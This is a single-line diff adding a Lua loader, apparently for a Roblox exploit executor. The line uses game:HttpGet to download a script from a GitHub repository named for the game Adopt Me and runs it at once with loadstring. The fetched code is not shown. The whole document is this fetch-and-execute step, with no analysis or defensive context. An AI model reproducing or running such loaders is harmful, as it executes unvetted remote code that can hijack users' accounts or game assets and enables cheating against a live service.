@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/turkeyjhonny/ADOPTMESCRIPT/refs/heads/main/ggsz.txt"))()
